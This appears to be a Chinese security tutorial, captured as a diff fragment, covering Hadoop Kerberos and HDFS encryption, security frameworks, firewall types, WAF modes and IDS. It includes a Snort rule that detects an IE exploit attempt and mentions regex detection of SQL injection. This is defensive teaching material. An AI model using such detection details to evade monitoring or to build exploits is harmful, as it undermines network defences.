+<p>那么，在使用了 Kerberos 认证机制后，我们要怎么去配置每一个 Hadoop 节点，来完成 Hadoop 集群的认证呢？这就需要我们在初始化 Hadoop 的各个节点时，为每个节点申请一个 Kerberos 的密钥文件 Keytab。</p>
+<p>Keytab 文件会使用一个 Principal 作为唯一的身份标识。Principal 的格式如下：username/host@realm。可以看到，Principal 由三个部分组成：username、host 和 realm。</p>
+<p>其中，“username”是服务所对应的用户身份。比如，Hadoop 的服务会分别以 hdfs 用户运行 HDFS 服务、以 yarn 用户运行 YARN 服务、以 mapred 用户运行 MapReduce 服务。因此，对应各个服务节点的“username”就是 hdfs、yarn 和 mapred。</p>
+<p>“host”即为服务节点在 DNS 中的主机名，“realm”为域标示，可以使用根域名来替代，比如 BAIDU.COM。</p>
+<p>现在，我们知道，通过 Principal，Keytab 文件会和节点的服务类型以及 Host 进行绑定。这样一来，每个服务节点都具备了能证实身份的唯一 ID 和密钥，也就可以保证在整个 Hadoop 集群中，各个节点都是可信任的。</p>
+<p>Kerberos 协议同样可以完成对用户的授权。当认证开启后，只要用户登录一台配置好了 Kerberos 密钥的服务器，就能以节点的身份向 Hadoop 发起认证了。</p>
+<p>总体来说，因为不同的 Hadoop 工具（Hive、HDFS 等）对授权和审计有不同的需求，所以，这些授权和审计功能通常会放到具体工具中去实现，无法由底层的 Hadoop 统一完成。而这种不统一会增加 Hadoop 管理的工作量，因此，在实际工作中，我们往往会选择通过集成额外的安全框架，来对授权和审计进行统一管理。我会在 Hadoop 安全框架的内容中，详细来讲解授权和审计机制。</p>
+<h3 id="Hadoop-中有哪些加密形式？"><a href="#Hadoop-中有哪些加密形式？" class="headerlink" title="Hadoop 中有哪些加密形式？"></a>Hadoop 中有哪些加密形式？</h3><p>在黄金法则之外，我们需要考虑的另外一点就是数据加密。和 MySQL 数据库一样，Hadoop 也支持对硬盘数据进行加密存储，这个过程主要集中在 HDFS 中：当数据写入 HDFS 时，数据会自动加密；当需要从 HDFS 读取数据时，数据会自动解密。在 MySQL 中，我们是以表为单位分配不同的密钥；在 HDFS 中，则需要我们主动创建 Zone 来进行加密。</p>
+<p>比如，通过下面的命令，我们能够在 HDFS 中创建一个 /zone 目录，对 /zone 目录中的所有数据进行加密。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hadoop fs -mkdir /zone</span><br><span class="line">hdfs crypto -createZone -keyName mykey -path /zone</span><br></pre></td></tr></table></figure>
+
+<p>但是，和 MySQL 数据库不同的是，HDFS 是一个分布式的存储系统，一份大数据会被分成若干个小数据，存储在不同的服务节点上。那么，HDFS 是怎么对加密密钥进行管理的呢？Hadoop 提供了一个密钥管理中心 KMS，当 HDFS 需要进行加解密操作时，会根据用户信息，向 KMS 请求对应的密钥，从而完成数据的加解密工作。</p>
+<h3 id="通过-Hadoop-安全框架来加强安全功能"><a href="#通过-Hadoop-安全框架来加强安全功能" class="headerlink" title="通过 Hadoop 安全框架来加强安全功能"></a>通过 Hadoop 安全框架来加强安全功能</h3><p>Hadoop 作为一个成熟的开源框架，当出现安全需求时，各个公司都会对其进行安全加固。当这些加固的技术成熟时，部分公司就会对这些技术进行整理，包装成为 Hadoop 提供安全加固的框架供我们使用。</p>
+<p>接下来，我就从我最熟悉的 3 个知名安全框架入手，为你详细讲解这些安全框架分别为 Hadoop 提供了哪些安全机制。</p>
+<p>首先我们来看 Apache Knox。</p>
+<p>Apache  Knox 是一个针对 Hadoop 集群的网关。所有对 Hadoop 集群的请求，需要先发送给 Apache Knox，然后由 Apache Knox 代理到 Hadoop 集群中去。对于用户来说，只能够看到 Apache Knox 的网关，而不能够直接和 Hadoop 集群进行通信。通过网关的形式，Apache Knox 将所有和 Hadoop 交互的行为进行了统一收口。在此基础之上，Apache Knox 就可以为 Hadoop 提供统一的安全管理能力，也就是进行用户的认证、授权和审计等工作。</p>
+<p><img src="/images/security/security-linux/11.jpg" alt="11"></p>
+<p>接着，我们再来说一说 Apache Sentry。</p>
+<p>Apache Sentry 相当于一个为 Hadoop 提供集中式授权的中心。它在 Hive、Impala 等数据引擎中添加一个插件，拦截所有对数据引擎的请求，并转发到 Apache Sentry 的授权中心。然后 Apache Sentry 会基于 role-BAC 的访问控制方式，对请求进行具体的授权。对于 Hadoop 的各类组件来说，Apache Sentry 是一个比较独立的授权引擎，可以随时地引入或者撤除。也就是说，Apache Sentry 为 Hadoop 提供了可“插拔式”的授权能力。</p>
+<p><img src="/images/security/security-linux/12.jpg" alt="12"></p>
+<p>最后是 Apache Ranger。</p>
+<p>Apache Ranger 提供了一个集中制的访问控制机制。通过 Apache Ranger 的管理后台，我们可以很方便地管理各类资源的授权机制。而且，这些授权机制是通过一个轻量级的 Java 插件，运行在各类工具的服务进程（比如 HDFS 的 namenode 进程，Hive 的 Hive2Server 进程等）中，所以，在 Hadoop 的服务节点上，不需要运行额外的进程。尽管耦合性更强，但 Apache Ranger 更便于管理，它相当于在每一个 Hadoop 工具中都加入了授权的能力。</p>
+<p><img src="/images/security/security-linux/13.jpg" alt="13"></p>
+<p>为了帮助你加深理解，我把这三个安全框架的功能简单地总结了一张表格。</p>
+<p><img src="/images/security/security-linux/14.jpg" alt="14"></p>
+<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>黑客在网络攻击时，第一步会扫描系统对外开放的端口，尝试发起连接或者攻击。比如，黑客可以扫描公司公网 IP 的 22 端口（SSH 服务），然后尝试爆破登录。这个时候，通过防火墙，我们既可以屏蔽掉开放的 22 端口，也能拦截爆破的请求。所以，防火墙是面对外部入侵的第一道防线。</p>
+<h3 id="防火墙如何为网络提供保护？"><a href="#防火墙如何为网络提供保护？" class="headerlink" title="防火墙如何为网络提供保护？"></a>防火墙如何为网络提供保护？</h3><p>防火墙是部署在网络边界上的一种安全设备，其概念比较宽泛，根据需求不同可以工作在 OSI（Open System Interconnection，开放式系统互联） 网络模型的一层或多层上。一般情况下，防火墙会和路由器搭配使用（或者说路由器能够承担部分防火墙的功能），来对网络进行隔离。</p>
+<p>根据实现方式和功能的不同，防火墙可以分为三种类型：包过滤防火墙、应用网关防火墙和状态检测防火墙。</p>
+<h4 id="包过滤防火墙"><a href="#包过滤防火墙" class="headerlink" title="包过滤防火墙"></a>包过滤防火墙</h4><p>包过滤防火墙工作在网络层和传输层上。在这两个层级中，网络请求都是以 TCP 或者 UDP 数据包的形式进行流动的。因此，包过滤防火墙是通过检测并拦截所有流经防火墙的 TCP 和 DUP 数据包，来对系统提供保护。它能够获取到的信息包括：源 IP 和端口、目标 IP 和端口、协议号等。由于大部分的路由器甚至 Linux 系统本身（Iptables）也具备类似的功能。因此，通常情况下，我们不需要采购额外的设备部署包过滤防火墙，只需要直接对网络边界的路由器进行设置，就能够满足最基本的拦截需求了。</p>
+<p>但是，在防护能力上，包过滤防火墙是比较弱的，它只能提供最基础的安全防护。这是因为，包过滤防火墙的过滤规则基本都是静态的。也就是说，包过滤防火墙只能够通过匹配 IP 地址和端口号，判断这些信息是否命中特定的规则来进行过滤。比如，禁止外网 IP 访问 80 和 443 以外的公司 IP 端口。所以，现在大部分的包过滤防火墙都进行了升级，引入了诸如“连接状态”等概念，也就变成了状态检测防火墙。</p>
+<h4 id="应用网关防火墙"><a href="#应用网关防火墙" class="headerlink" title="应用网关防火墙"></a>应用网关防火墙</h4><p>应用网关防火墙以代理的模式工作在应用层。所谓“代理”，即接收客户端发出的请求，然后以客户端的身份将请求再发往服务端。大部分的系统和应用都是工作在应用层的，因此，应用网关防火墙能够获取到系统和应用的全部信息，从而实现更复杂的功能，如：内容监控、认证、协议限制甚至缓存。</p>
+<p>在包过滤防火墙中，防火墙直接对流经的 TCP 和 UDP 包进行处理。而应用网关防火墙需要对 TCP 和 UDP 包进行解析，处理成应用层的数据协议，如 HTTP。因此应用网关防火墙对于网络的性能会产生负面影响，而且不是所有的应用都能够很好地兼容代理的存在，所以部署应用网关防火墙有可能对系统的可用性产生影响。除此之外，在应用网关防火墙中，服务端看到的请求都来自于代理，这会导致服务端无法有效地追踪请求的来源。</p>
+<p>尽管应用网关防火墙有这些潜在的危害存在，但是它能处理的信息最多，能够提供的安全防护能力也最强。由于 Web 攻击是黑客常见的攻击手段，因此，应用网关防火墙也逐渐演变成了专门的 Web 防火墙。</p>
+<h4 id="状态检测防火墙"><a href="#状态检测防火墙" class="headerlink" title="状态检测防火墙"></a>状态检测防火墙</h4><p>状态检测防火墙是包过滤防火墙的一种升级，它同样工作在网络层和传输层之上。状态检测和包过滤防火墙最大的不同在于，它会以连接的形式来“看待”低层级的 TCP 和 UDP 数据包。举个简单的例子。</p>
+<p>当客户端发起一次完整的 HTTP 请求时，会需要进行“TCP 三次握手”建立连接（SYN+ACK 数据包），HTTP 请求和响应的数据往往也是通过多个数据包才能完整发送。传统的包过滤防火墙只能基于每一个数据包进行判断，比如在“握手”的过程中，包过滤防火墙会分别看到 SYN、SYN+ACK、ACK 这三个数据包，并对每一个数据包进行判断。而事实上，这三个数据包（SYN、SYN+ACK、ACK）代表的是一次握手请求。所以，状态检测防火墙会尝试将这一连串的数据包组成一次完整的连接请求，从而获得一个更全面的视角，大大提高其安全性。</p>
+<p>对比应用网关防火墙，状态检测防火墙通常不会尝试将数据包构建成高层级的数据，也就是说它不会尝试去解析整个 HTTP 请求中的内容。因此，状态检测防火墙能获得更优的性能。目前市面上普遍采用的，都是状态检测防火墙。</p>
+<p><img src="/images/security/security-linux/15.jpg" alt="15"></p>
+<h3 id="防火墙可以为网络边界提供哪些保护呢？"><a href="#防火墙可以为网络边界提供哪些保护呢？" class="headerlink" title="防火墙可以为网络边界提供哪些保护呢？"></a>防火墙可以为网络边界提供哪些保护呢？</h3><p>网络边界之间的信用层级通常是不一样的，因此，我们需要利用防火墙在网络边界上提供必要的保护，使得跨越边界的数据和连接相对可信。</p>
+<h4 id="保护操作系统的漏洞"><a href="#保护操作系统的漏洞" class="headerlink" title="保护操作系统的漏洞"></a>保护操作系统的漏洞</h4><p>在操作系统的发展历程中，出现过很多臭名昭著的漏洞。比如：由于对网络请求处理不当，导致的 DDoS 攻击（如死亡之 PING、SYN 洪泛等）；由于高危服务默认开放导致的代码执行（如熊猫烧香扫描的是 135 和 445 端口的弱密钥）；由于服务漏洞导致的代码执行（如永恒之蓝利用的 SMB 漏洞）</p>
+<p>如果在这些漏洞曝光时，我们能即时更新操作系统补丁、关闭对应服务，那自然是能够避免系统和应用受到侵害。但是，在通常情况下，尤其是当公司扩大规模的时候，服务器管理员意识到问题并采取措施的这段响应时间，已经足够病毒或者蠕虫进行大规模地传播了。</p>
+<p>这时，防火墙的存在就很有必要了。一方面，防火墙可以迅速对全网的服务器进行保护，拒绝向高危端口发起的请求，如 Windows 中的 135、137 和 445 等，这也就是我们之前所说的“虚拟补丁”。另一方面，更加智能的防火墙，能够检测到整体流量中的异常变化，比如，突然出现了针对某个端口的大量请求，这就说明系统或者应用中很可能出现了新的漏洞，这时，防火墙可以产生报警甚至自动对异常的请求进行拦截，及时避免网络中的操作系统受到攻击。</p>
+<h4 id="阻止非法的信息流动"><a href="#阻止非法的信息流动" class="headerlink" title="阻止非法的信息流动"></a>阻止非法的信息流动</h4><p>在网络边界之间流动的数据，往往都会受到一定的规则约束。最著名的有中国的防火长城（Great Firewall）。防火长城的主要目的不是为了防止国外对中国发起网络攻击，而是根据法律法规，防止国内网民访问国外违法的数据信息。同样地，美国也存在类似的防火墙设备，比如：根据美国儿童网络保护法令（CHIPA），学校和图书馆的网络必须限制学生可以浏览的网页。</p>
+<p>除了防止非法地获取数据，防火墙同样能够防止敏感数据的流出。比如，防火墙可以对部分关键词或者敏感词进行检测阻止其外流。如果数据安全做得好一些的公司，可以对公司内的全部数据打上标签，然后根据标签的安全等级对跨越安全边界的数据进行处理。</p>
+<p>需要注意的是，防火墙能够提供的数据安全保护是有限的。原因在于，大部分防火墙都是用来处理较低层级的数据，且很多连接会对数据本身进行加密（VPN、HTTPS）。这就导致了防火墙实际能够看到的可识别数据并不多，拦截能力因此下降。其实，这种绕过防火墙的例子很常见，各类“梯子”能翻墙访问 Google 就是基于这个原理实现的。<strong>需要注意的是私建VPN是非法行为</strong></p>
+<h4 id="限制可访问的服务和审计"><a href="#限制可访问的服务和审计" class="headerlink" title="限制可访问的服务和审计"></a>限制可访问的服务和审计</h4><p>防火墙作为安全策略的一部分，还可以帮助公司落地安全制度。公司所有对于网络方面的限制和要求，基本都可以在防火墙上进行实现。比如：限制外网开放的服务只能是 HTTP 服务，那么所有非 HTTP 的请求就会被拦截；再比如，防火墙也可以对带宽的使用进行限制，避免某个服务抢占全部的带宽资源。</p>
+<p>除此之外，防火墙作为网络安全设备，它的日志功能通常比路由器等常规网络设备更加完备。因此，在网络攻击发生之后，我们需要进行事件调查时，防火墙日志是很关键的信息来源。</p>
+<h3 id="防火墙有哪些防御盲区？"><a href="#防火墙有哪些防御盲区？" class="headerlink" title="防火墙有哪些防御盲区？"></a>防火墙有哪些防御盲区？</h3><p>我们知道，防火墙不仅是网络安全中很重要的组成部分，也是我们最为熟知的安全工具。但是，在安全领域中不存在绝对，所以防火墙对于某些攻击也同样无能为力。接下来，我会主要讲解防火墙不能防御的攻击手段，在了解这些攻击之后，我们才能提高对防火墙和网络安全的整体认识。</p>
+<p>首先，防火墙只位于网络边界。因此，防火墙只能用来对跨越边界的请求进行检测和拦截。当请求通过后，后续发起的攻击请求对于防火墙来说，就是不可见的。比如，当黑客利用弱密钥，通过合法的 SSH 登录到服务器之后，就相当于穿透了防火墙的保护，之后黑客再通过 SSH 执行的命令，防火墙都无法检测和拦截。所以，防火墙不能防御已授权服务中的恶意攻击。</p>
+<p>其次，尽管防火墙位于网络边界，但这并不意味着所有的请求都会经过防火墙。比如，直接通过物理网线接入到服务器，黑客就可以在不经过防火墙的情况下进入内网（黑客偷偷潜入机房，[认真脸]）。在这种情况下，防火墙自然也起不到任何作用了。同样地，在网络内部发生的攻击行为，也不在防火墙的保护范围内。也就是说，防火墙不能防御不通过防火墙的访问。</p>
+<p>最后，作为边界设备，防火墙自身其实是暴露在外界的。因此，防火墙会遭受到黑客的直接攻击。如果防火墙自身的操作系统存在缺陷，那么，黑客就能够直接攻击并控制防火墙，然后关闭防火墙的防护功能，轻松突破边界。正是因为如此，部分防火墙厂商会为防火墙设备专门设计和开发一个加固过的专用操作系统，以此来提高防火墙的安全性。</p>
+<h2 id="WAF：如何为漏洞百出的Web应用保驾护航？"><a href="#WAF：如何为漏洞百出的Web应用保驾护航？" class="headerlink" title="WAF：如何为漏洞百出的Web应用保驾护航？"></a>WAF：如何为漏洞百出的Web应用保驾护航？</h2><p>随着 Web 应用越来越多，黑客的攻击目标也逐渐转向了针对 Web 安全的攻击。传统的防火墙主要专注于网络层的攻击防御，对 Web 安全的防御能力相对欠缺。因此，WAF（Web Application Firewall，Web 应用防护系统）的概念也就被提了出来。WAF 说白了就是应用网关防火墙的一种，它只专注于 Web 安全的防御，近几年来逐渐被当成一个相对独立的产品方向来研究。</p>
+<h3 id="WAF-的工作模式"><a href="#WAF-的工作模式" class="headerlink" title="WAF 的工作模式"></a>WAF 的工作模式</h3><p>WAF 的本质是“专注于 Web 安全的防火墙”，Web 安全关注于应用层的 HTTP 请求。因此，WAF 的分析和策略都工作于应用层。</p>
+<p>在 Web 安全这个方向上，WAF 对比防火墙又做出了哪些改进呢？我们可以从 WAF 的三种工作模式入手，探讨这两者的区别。这三种工作模式分别是：透明代理、反向代理和插件模式。</p>
+<p><strong>透明代理和大部分防火墙的工作模式相同</strong>：在客户端和服务端通信不需要作出任何改变的情况下，对 HTTP 流量进行请求和转发。在这个过程中，为了解密 HTTPS 流量，WAF 必须和服务端同步 HTTPS 对称密钥。</p>
+<p><img src="/images/security/security-linux/16.jpg" alt="16"></p>
+<p>透明代理的优点就是容易部署，它不需要客户端和服务端进行任何改动。但是，透明代理的缺点也有很多。透明代理本身不是一个 Web 服务，所以它无法修改或者响应 HTTP 的请求，只能够控制请求的通过或者拒绝。正因为如此，它也无法实现 Web 服务所提供的认证、内容过滤等功能。</p>
+<p><strong>区别于透明代理，反向代理要求客户端将请求的目标地址指向 WAF，而不是服务端</strong>。在反向代理工作模式中，服务端接收的请求，实际上也是由 WAF 发起的。在这个过程中，WAF 本身就相当于一个 Web 服务，只不过对所有的 HTTP 请求都进行了转发。</p>
+<p><img src="/images/security/security-linux/17.jpg" alt="17"></p>
+<p>因为反向代理 WAF 本质上是一个 Web 服务，所以 HTTPS 证书可以直接部署在 WAF 上。WAF 在对 HTTPS 流量解密之后，就可以在内网中用 HTTP 的形式，向服务端发起代理请求了。</p>
+<p>而且，反向代理 WAF 作为一个 Web 服务，能够提供的功能也更加丰富。比如，WAF 可以充当一个前置的认证平台，对所有请求进行身份校验和身份管理。同时，也因为在反向代理工作模式中，客户端和服务端不直接通信，而是将全部请求都先请求到 WAF 上，所以反向代理 WAF 对服务端的隔离也更加彻底。</p>
+<p>但是，反向代理同样存在缺点。首先，功能更丰富意味着性能开销更大。因此，反向代理 WAF 对硬件要求更高。其次，反向代理 WAF 一旦宕机，就无法响应客户端的任何请求。这样一来，即使服务端仍然正常，但用户已经无法正常使用应用了。而对于透明代理 WAF 来说，如果 WAF 宕机了，只是无法提供 Web 防护而已，客户端和服务端的通信不会受到任何影响。</p>
+<p><strong>最后，我们来看插件模式</strong>。在插件模式中，WAF 不再是网络中一个独立的安全产品了，而是以插件的形式依附于 Web 服务端本身，为 Web 安全提供防护。</p>
+<p>那怎么才能将 WAF 植入到服务端的逻辑中呢？我们最常使用的一种技术就是AOP（Aspect Oriented Programming，面向切面编程）技术。在 AOP 技术中，WAF 可以作为一个切片植入到服务端的逻辑中。</p>
+<p><img src="/images/security/security-linux/18.jpg" alt="18"></p>
+<p>而且，目前 AOP 技术十分流行，各类编程语言都支持。所以，插件模式的 WAF 部署同样十分简单。但是，这种将 WAF 和服务端强耦合的方式，会带来一定的负向影响。</p>
+<p>首先，WAF 和服务端一块工作在服务器上，会消耗服务器额外的资源，对 Web 服务本身的性能产生影响。</p>
+<p>其次，WAF 和服务端耦合，也就意味着 WAF 的所有改动都会直接影响到服务端。对于代理模式的 WAF 来说，通常只需要自测就可以升级了。而对于插件模式的 WAF，它本身的升级必须和服务端一起进入评估和测试流程，就会增加额外的工作量。</p>
+<p><img src="/images/security/security-linux/19.jpg" alt="19"></p>
+<p>总结一下，关于 WAF 的三种工作模式，你需要重点掌握这些内容：首先，WAF 将处理的请求协议限定为 HTTP，所以 WAF 比应用网关防火墙具备更高的专业性和灵活性；其次，WAF 可以以代理的形式，在网络中提供 Web 安全防护，也可以作为插件嵌入到服务端中；最后，我们也可以根据需求、成本和硬件环境等因素，选择不同的部署模式对 Web 安全进行防护。</p>
+<h3 id="WAF-的功能"><a href="#WAF-的功能" class="headerlink" title="WAF 的功能"></a>WAF 的功能</h3><h4 id="HTTP-解析能力"><a href="#HTTP-解析能力" class="headerlink" title="HTTP 解析能力"></a>HTTP 解析能力</h4><p>我们知道，WAF 专注于 Web 安全。因此，对 HTTP 请求进行解析是 WAF 最基础的能力。在 HTTP 中，通用的内容包括：请求的 URL 以及其中的参数、HTTP 头部信息、POST 的 body 内容等。</p>
+<p>除此之外，某些攻击特征可能隐藏得比较深，比如 JSON 中的某个字段，无法通过 JSON 的整体内容检测出来，我们必须一个字段一个字段去判断。因此，WAF 还需要解析 XML、JSON 等 RPC 传输协议，能够理解对应的 key 和 value 分别是什么。</p>
+<p>除了单纯地解析内容，WAF 还需要对 HTTP 内容做必要地处理。为什么要这么做呢？这主要有两方面原因</p>
+<p>第一，HTTP 中的内容可能经过了 UrlEncode 等编码方式的处理，因此，WAF 需要具备解码能力，避免攻击的特征通过编码来进行绕过。</p>
+<p>第二，想要看到 HTTPS 中的加密内容，WAF 必须能够解密 HTTPS 请求。在透明代理模式中，WAF 需要和服务端同步 HTTPS 的密钥，才能够获得解密的请求；在反向代理中模式中，WAF 自带证书，可以直接解密；在插件模式中，WAF 依靠服务端解密请求之后，再进行 HTTP 的解析。</p>
+<h4 id="Web-安全防护"><a href="#Web-安全防护" class="headerlink" title="Web 安全防护"></a>Web 安全防护</h4><p>通过对 HTTP 请求进行解析、对编码内容进行解码和对 HTTPS 进行解密之后，WAF 就能够获得全部 HTTP 请求内容了。在此基础之上，WAF 就可以对请求内容进行分析，为 Web 服务提供安全保护了。</p>
+<p>三种主要的分析手段：</p>
+<ul>
+<li>签名匹配：和杀毒软件中病毒库的概念类似，WAF 也可以维护一个攻击样本库。样本库中存有已知攻击请求的散列签名，只要 HTTP 请求内容的散列签名在这个样本库，就说明 HTTP 请求中携带了攻击内容。</li>
+<li>正则匹配：签名匹配需要请求完全一致才能够检测出来，而正则匹配只需要部分特征就可以检测。WAF 可以通过抽象一些攻击特征的正则表达式，对 HTTP 请求进行检测。比如，如果请求的某个参数中出现了单引号，那么很有可能就是黑客发起的 SQL 注入攻击。</li>
+<li>行为分析：除了针对单次请求的分析之外，WAF 还可以针对连续的访问请求特征进行提取和分析。为什么要这么做呢？这是因为，很多时候，我们无法准确判断单次请求是不是攻击请求，但是如果疑似的攻击请求频繁出现，我们就基本能够确定了。也就是说，一个用户不会频繁地访问同一个页面，而黑客需要对一个漏洞点发起多次尝试，才能够实现攻击的效果。</li>
+</ul>
+<p>在识别到攻击的请求之后，WAF 就可以对请求进行拦截，从而避免 Web 服务受到黑客的攻击了。</p>
+<h4 id="审计告警"><a href="#审计告警" class="headerlink" title="审计告警"></a>审计告警</h4><p>WAF 还有另外一个重要的功能，就是为 Web 服务提供安全相关的审计和告警功能。Web 安全相关的审计包括：发生攻击的时间、路径、频次等。通过这些信息，开发人员能够知道自己的 Web 服务面对的攻击威胁是什么样的，也就能够更好地评估威胁，完善 Web 安全防护机制。</p>
+<p>除此之外，WAF 还能提供其他的审计能力。这是因为，WAF 能够解析出 HTTP 请求的全部内容，提供审计所需要的全部日志字段。这些日志可以是各个页面的访问次数、用户的访问行为和接口的响应性能等。尽管这些指标和安全没有太多关系，但是它们对于产品设计和服务质量来说都很常见，那么 WAF 就可以作为一个统计分析工具，来为你提供服务。</p>
+<h4 id="数据保护和虚拟补丁"><a href="#数据保护和虚拟补丁" class="headerlink" title="数据保护和虚拟补丁"></a>数据保护和虚拟补丁</h4><p>反向代理或者插件模式的 WAF，还能够对 HTTP 请求中的数据进行一定的处理，提供额外的数据保护功能。</p>
+<p>最简单的，WAF 可以加密 HTTP 响应中的 Cookie 内容，使得 Cookie 以保密的形式存储在浏览器中。当浏览器将加密后的 Cookie 附加到 HTTP 请求中的时候，WAF 又可以进行解密。这样一来，服务端接收到的始终是明文的信息，而实际上，WAF 通过加解密为 Cookie 提供了额外的保护。另外，WAF 还可以对返回内容中的手机号、身份证号等敏感字段进行统一的打码处理，避免因为开发的疏忽，导致这些敏感信息的泄露。</p>
+<p>在介绍插件漏洞的时候，我们提到了防火墙可以提供虚拟补丁的功能，来临时对插件漏洞进行修复。如果插件是 Web 相关的服务，那么 WAF 是不是也可以提供虚拟补丁的功能呢？当然是可以的。那 WAF 是如何提供虚拟补丁的呢？我来举个简单的例子。</p>
+<p>在经典的 Structs 2 漏洞中，黑客是通过 Structs 2 中包含的漏洞接口发起攻击的。所以，WAF 只需要将这些包含漏洞的接口进行封禁，或者对请求内容中的 Structs 2 攻击特征（特定接口的异常序列化数据）进行分析拦截，就能够临时避免 Structs 2 受到已公开的漏洞攻击。之后，我们只需要对 Structs 2 进行升级再打上补丁，这样就可以下线虚拟补丁了。</p>
+<blockquote>
+<p>微服务通常都有统一的网关入口，因此WAF一般是和网关放在一块的。如果是自己实现的话，一般都是以Nginx的Lua插件来完成的。如果是引用的开源或者商用版本，一般WAF是串联在网关之前或者之后来进行过滤。经过网关处的WAF过滤后，内部微服务直接的HTTP调用就可以当作可信来处理了。</p>
+</blockquote>
+<h2 id="IDS：当黑客绕过了防火墙，你该如何发现？"><a href="#IDS：当黑客绕过了防火墙，你该如何发现？" class="headerlink" title="IDS：当黑客绕过了防火墙，你该如何发现？"></a>IDS：当黑客绕过了防火墙，你该如何发现？</h2><p>无论是防火墙还是 WAF，都无法达到 100% 的防护效果。黑客总是能有很多其他的办法，来隐藏自己或者直接绕过这些保护机制。因此，我们仍然需要对内网中的行为进行检测，及时发现已经入侵到内网中的黑客。这就需要用到 IDS（Intrusion Detection System，入侵检测系统）了。</p>
+<h3 id="什么是-IDS？"><a href="#什么是-IDS？" class="headerlink" title="什么是 IDS？"></a>什么是 IDS？</h3><p>IDS 的最终目的是检测黑客的攻击行为。那我们应该在哪里进行检测呢？首先是在网络流量中：黑客在控制了一台服务器之后，需要进行权限提升，而权限提升需要黑客在内网中挖掘各个服务器存在的漏洞。因此，黑客会发起很多探测和攻击的网络请求。其次就是在服务器系统中，黑客也可以利用服务器系统或应用本身的漏洞进行权限提升，同时，黑客也会尝试在系统中留下后门，这些行为都是通过系统操作来完成的。</p>
+<p>因此，根据检测内容的不同，IDS 可以分成两种类型：NIDS（Network Intrusion Detection System，网络入侵检测系统）和 HIDS（Host-based Intrusion Detection System，基于主机型入侵检测系统）。</p>
+<h4 id="第一种类型：NIDS"><a href="#第一种类型：NIDS" class="headerlink" title="第一种类型：NIDS"></a>第一种类型：NIDS</h4><p>在讲防火墙的时候，我们提到防火墙存在盲区：防火墙只能够检测穿越网络边界的流量，如果黑客已经进入到了内网，那防火墙就没办法提供任何的安全防护了。这个时候，我们就需要使用 NIDS 了。</p>
+<p>NIDS 主要检测网络流量中的攻击行为。区别于部署在网络边界的防火墙，NIDS 一般部署在内网的网络节点（路由器或交换机）中，所有的网络请求都会流经这些网络节点，所以，NIDS 基本可以获取到对应网络节点下全部的网络行为。</p>
+<p>另外，和防火墙不同的是，NIDS 一般不具备拦截网络请求的能力。这也让 NIDS 能够很好地隐蔽自己，让黑客很难发现。对于防火墙和 WAF 来说，黑客总是会不断尝试各种方式来绕过这些安全产品，原因就是黑客知道自己被拦截了。因此，这些安全产品需要不断地更新规则策略对抗黑客。如果黑客都不知道 NIDS 的存在，就不会刻意地去绕过 NIDS 的检测，这也使得 NIDS 的检测能力比较稳定，不需要频繁地更新规则策略。</p>
+<p>NIDS 是一个比较经典的安全产品，你可以直接使用市面上的开源工具，比如：Snort、Suricata等。这些工具也依据 CVE 库开发了完整的入侵检测规则。以 Snort 的一条检测规则为例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Rule Header  Message alert tcp <span class="variable">$EXTERNAL_NET</span> <span class="variable">$HTTP_PORTS</span> -&gt; <span class="variable">$HOME_NET</span> any</span><br><span class="line">Message   msg: “BROWSER-IE Microsoft Internet Explorer CacheSize exploit attempt”;</span><br><span class="line">Flow     flow: to_client,established;</span><br><span class="line">Detection  file_data;</span><br><span class="line">        content:<span class="string">"recordset"</span>; offset:14; depth:9;</span><br><span class="line">        content:<span class="string">".CacheSize"</span>; distance:0; width:100;</span><br><span class="line">        pcre:<span class="string">"/CacheSize\s*=\s*/"</span>;</span><br><span class="line">        byte_test:10,&gt;,0x3ffffffe,0,relative,string;</span><br><span class="line">Metadata   policy max-detect-ips drop, service http;</span><br><span class="line">Reference  reference:cve,2016-8077;</span><br></pre></td></tr></table></figure>
+
+<p>这个规则是用来检测 CVE 2016-8077 的。CVE 2016-8077 的攻击原理就是，黑客先构建一个恶意网站，如果用户使用 IE 浏览器访问了这个网站，就会被黑客控制。因此，在第一行的 Rule Header 中，定义了 NIDS 需要检测从外网 HTTP 服务返回给本地的 TCP 请求，也就是检测用户访问了一个网页并收到的返回请求。然后再 Detection 这个部分，对该漏洞的关键词进行正则匹配，也就是”/CacheSize\s<em>=\s</em>/“。这样一来，我们就能够发现，黑客通过这个 CVE 漏洞控制用户 IE 浏览器的攻击行为了。</p>
+<p>所以，我们在使用 NIDS 的时候，只要注意及时对规则进行维护即可。从 Snort 的规则中，我们也可以看出，NIDS 的检测逻辑就是对请求的内容进行正则匹配，不具备分析上下文的能力。因此，NIDS 一般只能够对单次的攻击请求进行检测。</p>
+<h4 id="第二种类型：HIDS"><a href="#第二种类型：HIDS" class="headerlink" title="第二种类型：HIDS"></a>第二种类型：HIDS</h4><p>精明的黑客在控制了服务器之后，会尽可能避免发送大量的网络请求，以此来隐藏自己。那么，我们是不是就没办法发现黑客了呢？当然不是。无论多么精明的黑客也一定会在服务器上留下各种痕迹。不管是入侵的时候，通过各种 Web 漏洞执行了系统命令，还是入侵成功之后，在系统中埋下了后门，又或者是直接利用系统漏洞进行权限提升，这些操作最终都会在服务器系统上执行。因此，我们可以通过监控各个用户在服务器系统上的行为来检测黑客的存在。这就是 HIDS 的功能了。</p>
+<p>HIDS 主要检测服务器系统中的攻击行为。NIDS 运行在某个网络节点之上，相当于集中式的对网络流量进行检测，但是 HIDS 运行于每一个服务器中，也就相当于对系统行为进行分布式检测。那分布式的行为处理有什么好处呢？在 NIDS 中，我们是基于少量的网络节点检测全部的网络流量。而在 HIDS 中，只需要每个服务器检测各自内部的行为，也就相当于将资源消耗分散到了每一台服务器中，这就对硬件的性能要求比较低，也就节约了公司的防护成本。</p>
+<p>另外，HIDS 一般以 ROOT 权限运行在操作系统中。因此，HIDS 能够监控的行为更丰富，比如：</p>
+<ul>
+<li>执行的系统命令</li>
+<li>发起和接受的网络请求</li>
+<li>运行的进程、监听的端口号等</li>
+<li>系统关键文件的完整性</li>
+<li>其他黑客可能留下痕迹的地方</li>
